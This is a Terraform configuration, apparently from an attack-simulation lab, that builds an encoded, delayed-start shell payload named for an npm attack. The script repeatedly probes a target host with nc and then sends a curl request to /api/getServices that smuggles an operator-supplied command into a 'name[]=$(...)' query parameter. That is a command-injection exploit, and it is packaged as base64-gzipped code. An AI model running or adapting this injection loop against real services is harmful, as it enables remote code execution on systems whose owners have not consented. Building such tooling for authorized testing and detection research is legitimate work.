locals {
    attack_dir = "/npm_attack"
    target_ip=var.inputs["target_ip"]
    target_port=var.inputs["target_port"]
    payload = <<-EOT
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "cleaning app directory"
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir}
        cd ${local.attack_dir}

        log "starting script..."
        log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.inputs["payload"]})'"
        log "checking target: ${local.target_ip}:${local.target_port}"
        while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
            log "failed check - waiting for target";
            sleep 30;
        done;
        log "target available - sending payload";
        sleep 5;
        curl --get --verbose "http://${local.target_ip}:${local.target_port}/api/getServices" --data-urlencode 'name[]=$(${var.inputs["payload"]})' >> $LOGFILE 2>&1;
        echo "\n" >> $LOGFILE
        log "payload sent sleeping..."
        log "done";
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
            log 'waiting ${var.inputs["attack_delay"]} seconds...';
            sleep ${var.inputs["attack_delay"]}
        fi
    done
    log "Done."
    EOT

    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}